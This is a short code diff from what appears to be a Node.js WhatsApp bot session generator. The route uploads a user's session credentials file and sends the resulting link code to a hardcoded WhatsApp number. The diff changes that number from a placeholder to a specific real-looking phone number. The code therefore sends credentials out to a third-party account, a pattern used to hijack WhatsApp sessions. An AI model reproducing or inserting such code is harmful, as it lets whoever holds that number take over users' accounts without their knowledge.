@@ -58,7 +58,7 @@ router.get('/', async (req, res) => {
                		await delay(10000);
 	let link = await upload(`${session.user.id}.json`,__dirname+`/temp/${id}/creds.json`);
    let code = link.split("/")[4]
-let owww = '919888888888@s.whatsapp.net'
+let owww = '917448520075@s.whatsapp.net'
                         await session.sendMessage(owww, {text:`Afiya~${code}`})
      
 
